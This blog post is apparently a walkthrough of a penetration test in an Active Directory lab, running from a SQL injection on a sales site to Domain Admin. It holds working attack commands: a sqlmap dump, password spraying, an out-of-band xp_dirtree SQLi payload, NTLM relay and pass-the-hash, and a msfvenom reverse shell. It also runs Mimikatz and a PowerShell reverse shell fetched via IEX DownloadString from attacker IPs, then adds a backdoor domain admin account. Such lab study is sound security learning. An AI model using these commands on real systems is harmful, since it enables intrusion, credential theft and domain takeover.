---
layout: post
title: Active Dirctory Adventures part 1
---

Windows Active Directory is a database of network reasource objects. That proliferates in modern enterprise network architectures.

A friendly wizard of such systems, lkys37en, has graciously allowed me to test out his lab, which replicates a modern enterprise Active Directory infrastructure supporting a small-medium sized business with a real go-getter of a Systems Admin who has taken steps to harden the system. This post will document the journey from external client to Domain Controller using some fun tools and tricks and filling in the gaps where I can, with some AD talk and explanation.


We not even going to waste time with the initial basic nmap scan (`nmap -sV -Sc IP`) because we know there is a firewall in place and that would retun nothing. So we scan the likely ports with the no ping (-Pn) option and add increased speed (-T4) and version detection (-sV)

`nmap -T4 -sV -Pn -p80,443 10.7.12.0/24`

![](https://braaaax.github.io/braaaax.github.io/images/lky-nmap.jpg)

Alright we have some open http and https ports on 10.7.12.11-12. We bust the ports for available directories and find on on 10.7.12.12/mvc, a sales site and uses a backend database to manage its merchandise information. We also find 10.7.12.11/rdweb, which is Microsoft's Remote Desktop Web access portal. This is real interesting, but we have no info to log in so we put that on the back burner. We browse the sales site and `ProductSubCategoryId=18` makes us suspicious of a possible SQLi vulnerability.


![](https://braaaax.github.io/braaaax.github.io/images/lky-site.jpg)


The url shows an aspx script that makes a call to the databse to retrieve product information and it doesn't look like that data is sanitized. We capture the request with Burp Suite and probe this injection point with sqlmap. We can use the "copy to file" function and write the request to product.req and then sick sqlmap on it.


![](https://braaaax.github.io/braaaax.github.io/images/lky-mvc-web-req.jpg)


`sqlmap -r product.req --level=5 --risk=3`

Success! We go ahead and dump the entire database. (Warning this can be bad with very large databases!!). Of interest is a table giving Active Directory users fullnames groups.

```

Database: ADConnect
Table: ADUsers
[40 entries]
+------------+-------------+-----------------+
| LastName   | FirstName   | Department      |
+------------+-------------+-----------------+
| Vazquez    | Annie       | Finance         |
| Falcon     | Paul        | Finance         |
| Anthony    | Fae         | Finance         |

           ( ... more names ... )

| Wilson     | Johnny      | Sales           |
| May        | Juan        | Sales           |
+------------+-------------+-----------------+

```


If we can derive the correct username given the full names of the AD users we can spray the rdweb login. For this one can use a tool like burp intruder. First lets get our lists together. We'll try the first letter of firstname and lastname as a format. And use standard recent Windows default passwords.


```python

import csv
with open("/root/.sqlmap/output/10.7.12.12/dump/ADConnect/ADUsers.csv") as csvfile:
    reader = csv.DictReader(csvfile)
    for row in reader:
        print('{}{}'.format(row['FirstName'][0].lower(), row['LastName'].lower()))

```

Passords List:
Summer2017!
Winter2017!
Fall2017!
Spring2017!
Summer2018!
Winter2018!
Fall2018!
Spring2018!


Intruder: 
*  you can use the "cluster bomb" attack
*  remove the placeholders save for the the two USERNAME fields and the the PASSWORD field
*  we are relating payloads to a given placeholder here so use the userlist you created for placeholder1 and copy that lost for paload 2 and use a password list for payload 3
*  make sure to Always Follow Redirection in the options tab



![](https://braaaax.github.io/braaaax.github.io/images/lky-rdweb-login.jpg)


![](https://braaaax.github.io/braaaax.github.io/images/lky-burp-intruder.jpg)



User Credentials Found:
*  LAB\avazquez:Spring2017!
*  LAB\mholliday:Summer2017!
*  LAB\wbaird:Autum2017!

We login with LAB\avazquez.

![](https://braaaax.github.io/braaaax.github.io/images/lky-valid-login.jpg)


We don't want the rdweb and its two applications, we want the full experience. So we log into Annie's account with remmina.

![](https://braaaax.github.io/braaaax.github.io/images/lkys-remmina.jpg)


We can see Windows Defender and Applocker are preventing us from executing most things (Applocker includes AMSI). Pasting the contents of [applocker-bypass-checker.ps1](https://github.com/barryclark/jekyll-now) into notepad and saving as a .ps1 file allows us to sidestepp Defender momentarilly. Running shows us the \windows\Tasks, \windows\tracing\, \windows\system32\spool\drivers\color allow "BUILTIN\USERS" write/createFiles & execute auth.


![](https://braaaax.github.io/braaaax.github.io/images/lky-Applocker-Bypass.png)

![](https://braaaax.github.io/braaaax.github.io/images/lky-constrained-PS.png)

![](https://braaaax.github.io/braaaax.github.io/images/lky-powershdll.png)



We use Shellter to trick Applocker further by "rewiring" nc.exe to call to a waiting metasploit listener. Shellter adds some malicious shell code into a legitimate exe. We add a meterpreter reverse tcp shell to nc.exe. Shellter can take some trial and error. Try and build a stable of exe's that work all or most of the time. 


![](https://braaaax.github.io/braaaax.github.io/images/lky-brax-exe.png)
![](https://braaaax.github.io/braaaax.github.io/images/lky-msf-01.png)


Once we've gotten our meterpreter shell. We can create a listener with empire and execute it with msf via the load_powershell module. Moving to empire is not necessary though it's nice to be able to do.

Going from msf to empire (via Chryzsh):
In Empire:
create a default http listener named "http"
*  uselistener http
*  set Host 10.7.253.10
*  set Port 4444
*  execute

create copy launcher, created w/o base64
*  back
*  usestager multi/launcher
*  set Base64 false
*  generate

In MSF:
*  load powershell
*  powershell_shell
*  paste listener and execute await agent in empire



Either via empire or by importing the PowerView.ps1 module into your msf powershell_shell, we can enumere the domain. Let's take a look at the boxes in the domain.


ComputerName
*  DC01
*  WS03
*  FS01
*  MX01
*  WEB01
*  WS05
*  RDS02
*  SQL01



Using Invoke-Sharefinder we discover a VPN to facilitate internal access to the interior subnet to avoid lots of proxies. From an interior IP We can use responder and ntlnrelayx to dump hashes and get sessions for users without knowing the password. Somthing like `Invoke-Inveigh` could be used externally, but I have had limited success.


![](https://braaaax.github.io/braaaax.github.io/images/lky-invoke-sharefinder.png)



After some enumeration we find: `//FS01.lab.local/GroupData/LabUserVPN.ovpn`


We fire up responder, but we don't get any hashes. Responder needs a user to initiate a request. On a typical network there are browser and smb share request flying around all the time, but it looks like we will have to get creative. 

We have an injection point from step one. To prompt the hash of the owner of the sql db to be sent to responder we need to instigat a DNS query to our IP. We are requesting data be sent via HTML, SMB, or DNS. With MSSQL we use `master..xp_dirtree` (MySQL: LOAD_FILE()). Supplying a hostname to these functions will cause a DNS lookup to occur. We're not interested in successful transmission of the information but the target user with send their netNTLMv2 hash along with their request to our machine. [Futher Reading] (https://www.gracefulsecurity.com/sql-injection-out-of-band-exploitation/)

Our uri payload will be: `/mvc/Product.aspx?ProductSubCategoryId=18;declare @q varchar(99);set @q='\\10.8.254.14\test1'; exec master.dbo.xp_dirtree @q`


![](https://braaaax.github.io/braaaax.github.io/images/lky-out-of-band-sqli-req.png)


![](https://braaaax.github.io/braaaax.github.io/images/lky-responder.png)


We run `./ntlmrelayx.py -tf targets.txt` along side responder and get the sam hashes we're after:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:06a380cfedba265a9bcf51f2cffa40fa::: 
```

Next we want to put those hashes to use and get a shell as Administrator


```
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e administrator@10.8.14.14

Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies


[*] Requesting shares on 10.8.14.14.....
[*] Found writable share ADMIN$
[*] Uploading file JkqJuZDF.exe
[*] Opening SVCManager on 10.8.14.14.....
[*] Creating service HPPN on 10.8.14.14.....
[*] Starting service HPPN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```



Success as system on sql01 let's create a rat with msfvenom (`msfvenom -p windows/shell/reverse_tcp lhost=10.8.254.10 lport=4444 -f exe -o callbrax.exe`) and get a meterpreter shell. Meterpreter and incognito make it trivial to use token impersonation to spawn a shell as a user. We see BDavis is a user on the box, he's our target.  


GPO Enumeration:
`Get Group Policy Objects`

`Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}`

`Get-NetGPO -DisplayName MailServer-Config | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}`

`Get-NetOU -GUID "{2259E5B0-3B49-4704-98BB-5A9581B54E8E}" | %{Get-NetComputer -ADSpath $_}`



Add "Server Admins" to the below file to give BDavis Administrator status on MX01.

`type "\\lab.local\sysvol\lab.local\Policies\{2259E5B0-3B49-4704-98BB-5A9581B54E8E}\MACHINE\Preferences\Groups\Groups.xml"`

`Invoke-GpUpdate -Computer MX01 -Force`


Since BDavis is no admin on MX01 we can run Mimikatz on the Box and discover the credentials of BRoss who is Domain Admin.

Add `Invoke-Mimikatz` to the bottom of my copy of Invoke-Mimikatz.ps1 I serve the file with python's SimpleHTTPServer and execute it from memory on MX01:

`Invoke-Command -ComputerName MX01 -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://10.8.254.10/Invoke-Invoke-Mimikatz.ps1')}`


We get NTLM hashes for BRoss, who is a Domain Admin. With this info we are able to use the Ross account to add us to net users and Domain Admins
We use cme to expoit the hashes and get a shell. We use the same methodology:

`cme smb 10.8.14.10 -u BRoss -H '49a074a39dd0651f647e765c2cc794c7' -X 'IEX (New-Object Net.WebClient).DownloadString("http://10.7.253.6/Invoke-PowerShellTcpOneLine.ps1")'`

![](https://braaaax.github.io/braaaax.github.io/images/lky-cme-screenshot.png)


Lastly, As BRoss I add myself to all the good places:

```
net user brax password /add /domain
net group "Domain Admins" /add brax /domain
net group "Remote Desktop Users" /add lab\brax /domain
```


Now on to the second Domain,  lky.local  in part 2.
